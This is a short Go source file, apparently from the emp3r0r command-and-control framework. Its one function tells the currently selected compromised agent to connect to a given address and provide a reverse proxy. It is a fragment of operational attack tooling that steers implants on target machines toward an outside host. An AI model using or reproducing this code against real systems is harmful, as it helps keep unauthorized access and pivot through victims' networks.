//go:build linux
// +build linux

package cc


import (
	"fmt"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
)

func moduleBring2CC() {
	addr := Options["addr"].Val
	cmd := fmt.Sprintf("%s %s", emp3r0r_data.C2CmdBring2CC, addr)
	err := SendCmd(cmd, "", CurrentTarget)
	if err != nil {
		CliPrintError("SendCmd: %v", err)
		return
	}
	CliPrintInfo("agent %s is connecting to %s to provide a reverse proxy", CurrentTarget.Tag, addr)
}
